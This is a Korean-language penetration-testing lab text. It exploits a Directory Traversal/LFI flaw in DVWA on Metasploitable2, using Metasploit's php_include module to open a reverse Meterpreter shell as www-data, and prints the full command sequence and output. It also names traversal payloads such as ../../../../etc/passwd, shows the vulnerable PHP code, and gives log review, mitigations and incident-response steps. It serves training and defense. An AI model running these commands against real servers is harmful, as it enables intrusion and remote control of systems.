[Chapter 1] Directory Traversal (LFI) 아키텍처 개요

본 실습 교재는 웹 모의 해킹 10선 중 8번 예제인 Directory Traversal (디렉터리 경로 우회) 및 LFI (Local File Inclusion, 로컬 파일 포함) 취약점에 대한 심층 분석 보고서입니다. 공격자가 웹 애플리케이션의 파일 참조 파라미터를 조작하여, 웹 루트(Web Root) 디렉터리를 벗어나 OS(운영체제)의 핵심 시스템 파일(예: /etc/passwd)에 접근하거나, 로그 파일에 악성 코드를 주입하여 RCE (Remote Code Execution, 원격 코드 실행)로 연계하는 일련의 과정을 아키텍트 관점에서 상세히 다룹니다.

* LFI (Local File Inclusion, 로컬 파일 포함): 웹 애플리케이션이 서버 내부에 이미 존재하는 파일(로컬 파일)을 실행하거나 화면에 출력하도록 조작하는 해킹 기법입니다.
* Directory Traversal (디렉터리 경로 우회): ../ (상위 디렉터리 이동) 문자를 반복 사용하여 허용된 웹 폴더를 벗어나 시스템 전체 파일에 접근하는 기법입니다.

[Chapter 2] 1단계: 작업 로그 영구 보존 및 MSF 초기화

모의 해킹 실무에서 가장 중요한 것은 행위의 증명입니다. Metasploit 내장 기능인 spool을 사용하여 터미널 화면에 출력되는 모든 명령어 입력값과 대상 서버의 응답 결과를 텍스트 파일로 영구 저장합니다. 이는 추후 침해 사고 보고서(Incident Report) 작성 시 법적 증빙 자료로 활용됩니다.

[도식 2: Spool (스풀) 로깅 데이터 흐름]

msf6 > workspace -a PT_Metasploitable2 [*] Added workspace: PT_Metasploitable2 [*] Workspace: PT_Metasploitable2 # [해설] 다수의 프로젝트가 섞이지 않도록 이번 실습 대상(Metasploitable2) 전용 데이터베이스 워크스페이스(Workspace, 독립 작업 공간)를 생성하고 이동합니다.
* Spool (스풀): Simultaneous Peripheral Operations On-Line의 약자로, 본래 프린터 대기열을 의미하지만 해킹 툴에서는 터미널 화면의 텍스트 출력을 파일로 갈무리하여 저장하는 감사 로깅 기능을 뜻합니다.
* Workspace (워크스페이스): PostgreSQL 데이터베이스 내에서 타겟 그룹별로 스캔 데이터베이스를 분리하여 관리하는 논리적 구역입니다.

[Chapter 3] 2단계: 정보 수집(Reconnaissance) 및 스캐닝

웹 취약점을 공략하기 위해 대상 서버의 웹 데몬(Web Daemon) 종류와 버전을 파악합니다. MSF 내부에서 Nmap을 직접 호출하여 포트와 서비스를 스캔하고, 그 결과를 데이터베이스에 자동 기록합니다.

[도식 3: Nmap 스캔 및 MSF DB 저장 아키텍처]

Apache/2.2.8
PostgreSQL 적재

* Reconnaissance (정보 수집, 정찰): 모의 해킹의 가장 첫 단계로, 타겟 시스템의 OS 종류, 열려있는 포트, 가동 중인 서비스 버전 등을 수집하여 공격 표면(Attack Surface)을 식별하는 과정입니다.
* Apache HTTP Server (아파치 웹 서버): 전 세계에서 가장 널리 사용되는 오픈소스 웹 서버 소프트웨어로, PHP 모듈과 결합하여 동적 웹 페이지를 서비스합니다.

[Chapter 4] 3단계: 익스플로잇 (LFI 공격 실행 및 쉘 획득)

Metasploitable 2에 포함된 DVWA(Damn Vulnerable Web Application)의 File Inclusion 페이지를 타겟으로 삼습니다. 단순한 파일 열람을 넘어, PHP 환경 설정인 allow_url_include가 활성화되어 있는 결함을 역이용하여, 원격 서버에 악성 PHP 코드를 포함시켜 실행시키는 LFI to RCE (로컬 파일 포함을 통한 원격 코드 실행) 기법을 MSF 모듈로 실증합니다.

[도식 4: PHP Data Wrapper를 이용한 LFI to RCE 아키텍처]

data://text/plain;base64,...

msf6 > use exploit/unix/webapp/php_include [*] No payload configured, defaulting to php/meterpreter/reverse_tcp # [해설] LFI 취약점을 원격 코드 실행(RCE)으로 에스컬레이션(Escalation, 권한 상승) 시켜주는 전용 익스플로잇 모듈을 선택합니다. PHP 환경에서 동작하는 미터프리터 역방향 쉘(reverse_tcp) 페이로드가 자동으로 세팅됩니다.
msf6 exploit(unix/webapp/php_include) > set RHOSTS 192.168.1.100 RHOSTS => 192.168.1.100 msf6 exploit(...) > set LHOST eth0 LHOST => 192.168.1.50 # [해설] 타겟 서버의 IP(RHOSTS)와 역방향 쉘을 수신할 공격자의 인터페이스(LHOST, eth0)를 각각 할당합니다.
msf6 exploit(...) > set PATH /dvwa/vulnerabilities/fi/ PATH => /dvwa/vulnerabilities/fi/ msf6 exploit(...) > set POSTDATA "page=XXpathXX" # [해설] 공격 대상 웹 애플리케이션의 정확한 취약점 디렉터리 경로(PATH)를 지정합니다. POSTDATA 또는 GET 방식으로 전달될 파라미터를 설정하며, 프레임워크가 악성 페이로드를 주입할 위치를 인식하도록 'XXpathXX' 라는 플레이스홀더(Placeholder, 예약어)를 삽입합니다.
msf6 exploit(...) > set HEADERS "Cookie: security=low; PHPSESSID=e1b2c3d4..." # [해설] DVWA는 로그인된 세션이 필요하므로, 사전에 탈취하거나 생성한 유효한 세션 쿠키(Cookie) 값을 HTTP Header에 수동으로 주입하여 인증을 우회합니다. 보안 레벨(security)을 low로 강제 설정합니다.
msf6 exploit(...) > exploit [*] Started reverse TCP handler on 192.168.1.50:4444 [*] Sending stage (39282 bytes) to 192.168.1.100 [*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:53124) at 2026-03-19 10:20:15 +0900 # [해설] 공격을 실행합니다. MSF 엔진이 악성 PHP 페이로드를 Base64 인코딩하여 data:// 래퍼(Wrapper) 형태로 조립한 뒤 타겟 서버에 HTTP 요청을 날립니다. 타겟 서버의 PHP가 이를 해석하고 실행하여 공격자(포트 4444)에게 미터프리터 세션을 열어줍니다! 서버가 장악되었습니다.
meterpreter > sysinfo Computer : metasploitable OS : Linux metasploitable 2.6.24-16-server #1 SMP Meterpreter : php/linux meterpreter > getuid Server username: www-data (33) # [해설] 획득한 쉘(Shell) 내에서 시스템 정보를 조회(sysinfo)하고, 현재 프로세스 소유자의 권한(getuid)을 확인합니다. 웹 데몬 실행 계정인 www-data 권한을 획득했습니다. 추후 이 계정에서 Linux 커널 취약점을 이용한 권한 상승(Privilege Escalation)을 시도하여 root를 탈취하는 것이 다음 단계입니다.
* RCE (Remote Code Execution, 원격 코드 실행): 공격자가 원격지(네트워크 밖)에서 타겟 서버 운영체제의 쉘 명령어 체계를 임의로 실행할 수 있는 상태를 의미하는 가장 치명적인 최고 등급의 취약점입니다.
* PHP Data Wrapper (PHP 데이터 래퍼): PHP 환경에서 data:// 스키마를 사용하여 파일 시스템이 아닌 스트림 데이터(예: Base64로 인코딩된 문자열)를 직접 파일처럼 읽어들여 파싱(Parsing)하고 실행하게 만드는 내부 기능입니다.

[Chapter 5] 4단계: 타겟 서버 실시간 로그 분석 및 탐지 여부 (Blue Team)

방어자(Blue Team)의 관점에서, 현재 수행된 공격이 서버의 감사 로그에 어떻게 기록되었는지 검증합니다. SSH를 통해 Metasploitable 2 서버에 접속하여 Apache 웹 서버의 접근 로그(Access Log)를 실시간으로 모니터링하여 공격 흔적(Artifact)을 색출합니다.

* Blue Team (블루 팀): 사이버 보안 훈련에서 공격을 방어하고 시스템 내 취약점을 식별 및 조치하며 보안 로그를 모니터링하는 수비형 방어 조직을 지칭합니다. 반대는 공격팀인 Red Team(레드 팀)입니다.
* SIEM (Security Information and Event Management, 보안 정보 및 이벤트 관리): 엔터프라이즈 환경에서 방화벽, 웹 서버, 운영체제 등 수많은 장비에서 발생하는 보안 로그를 중앙으로 수집하고 상관 분석하여 침해 위협을 실시간으로 경고하는 거대한 보안 인프라 시스템입니다.

[Chapter 6] 잘못된 설정 원인, 대응 방안 및 후속 대처 아키텍처

Root Cause

취약점이 발생한 소스 코드 원인 (Root Cause)

이러한 Directory Traversal 및 LFI 취약점의 근본적인 원인은 개발자가 사용자의 입력값(Input)을 절대적으로 신뢰하고, 운영체제의 파일 시스템과 상호작용하는 민감한 함수에 검증 없이 그대로 전달(Pass)했기 때문입니다. 또한 PHP 서버의 전역 환경 설정 결함이 맞물려 치명적인 RCE로 발전했습니다.

1. 애플리케이션 소스 코드 결함

$file = $_GET['page'];
include($file);

include()나 require() 함수에 입력되는 $file 변수에 ../와 같은 특수 문자 필터링(Sanitization) 로직이 전혀 존재하지 않습니다.

2. php.ini 환경 설정 위험 (Misconfiguration)

allow_url_fopen = On
allow_url_include = On

로컬 파일 뿐만 아니라, 외부 서버의 악성 스크립트를 URL 형태로 직접 불러와 서버 메모리에서 실행하게 허용하는 극도로 위험한 설정 옵션이 켜져 있습니다.

Mitigation

아키텍처 기반 보안 대응 방안 (Mitigation)

이러한 취약점을 원천적으로 차단하기 위해서는 시큐어 코딩(Secure Coding) 가이드라인을 준수하여 애플리케이션을 리팩토링하고, 엔터프라이즈 환경에 맞는 방어 솔루션을 다중으로 배치하는 심층 방어(Defense in Depth) 전략을 구축해야 합니다.

  • 입력값 화이트리스트(Whitelist) 검증 도입: 파일 이름을 받아올 때, 서버에 존재하는 안전한 파일명들의 목록(Array)을 미리 정의해두고, 입력값이 해당 목록에 정확히 일치(Strict Matching)할 때만 파일을 호출하도록 소스 코드를 재설계합니다.
  • 디렉터리 조작 문자 강제 절삭 (Basename 함수): PHP의 basename() 함수를 사용하여, 입력된 긴 경로(../../../../etc/passwd)에서 앞의 디렉터리 경로를 모두 잘라내고 순수 파일명(passwd)만을 추출하도록 강제합니다.
  • 서버 환경 설정 하드닝 (Hardening): php.ini 파일에서 외부 URL 참조를 차단하기 위해 allow_url_include = Off 로 반드시 비활성화합니다.
  • WAF (웹 애플리케이션 방화벽) 도입: 네트워크 앞단에 WAF 솔루션(예: AWS WAF, ModSecurity 등)을 배치하여 URL 내부에 ../ 패턴이나 /etc/passwd 같은 시스템 파일 명칭이 포함된 악성 HTTP 요청(Request)을 웹 서버 도달 이전에 실시간으로 드랍(Drop)시킵니다. ※ 단, AWS WAF 등 클라우드 보안 서비스는 적용하는 룰(Rule) 개수 및 트래픽 양에 따라 추가 과금(유료)이 발생하므로 비용 산정이 선행되어야 합니다.
Incident Response

사후 조치 및 침해 사고 후속 대처 (Post-Incident)

이미 LFI 공격을 통해 미터프리터 세션이 연결되었거나 중요 데이터가 유출된 것이 로그로 확인된 최악의 시나리오라면, 다음과 같은 표준 침해 사고 대응(Incident Response) 절차를 신속히 가동해야 합니다.

1

네트워크 격리(Isolation): 즉각적으로 감염된 대상 웹 서버의 외부 인터넷 통신망(Outbound/Inbound)을 물리적, 논리적으로 물리적으로 차단하여 추가적인 데이터 유출과 공격자의 명령 제어(C&C) 통신을 단절시킵니다.

2

침해 아티팩트(Artifact) 보존: 서버 전원을 끄지 않은 상태에서 RAM(메모리) 덤프를 뜨고 시스템 로그(Syslog, Apache Log)를 안전한 별도 저장소로 격리 보관하여 포렌식(Forensics) 조사를 위한 무결성을 확보합니다.

3

백도어(Backdoor) 색출 및 시스템 복원: 공격자가 시스템 재접속을 위해 심어둔 악성 웹 쉘(Web Shell) 파일이나 크론탭(Crontab), 변경된 계정 비밀번호를 조사하고 삭제합니다. 오염 범위가 넓다면 클린 백업(Clean Backup) 본으로 시스템 포맷 및 복원을 진행합니다.

* Whitelist (화이트리스트): 명시적으로 허가된 안전한 항목들의 목록만 접근을 허용하고, 그 외의 모든 것은 기본적으로 거부(Default Deny)하는 가장 강력한 보안 설계 원칙입니다.
* WAF (Web Application Firewall, 웹 애플리케이션 방화벽): 일반 방화벽(L4)이 포트 번호 기반으로 트래픽을 차단하는 것과 달리, HTTP 프로토콜의 내용(L7)을 검사하여 SQL 인젝션, XSS, LFI 등의 웹 특정 해킹 시도를 차단하는 전용 보안 장비입니다.
